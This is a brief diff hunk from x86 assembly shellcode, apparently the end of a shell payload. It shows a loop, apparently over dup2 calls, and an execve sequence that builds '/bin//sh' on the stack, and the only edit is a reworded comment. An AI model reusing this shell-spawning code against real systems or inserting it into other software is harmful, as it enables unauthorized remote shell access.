@@ -77,7 +77,7 @@ lp:
 	jns lp		; Jump if not sign (positive value) - loop
 
 execve:
-	push edx        ; NULL to terminate "/bin//sh"
+	push edx        ; Pushing NULL to terminate "/bin//sh"
 	push 0x68732f2f	; "hs//"
 	push 0x6e69622f ; "nib/"
 	mov ebx, esp    ; EBX points to "/bin//sh"
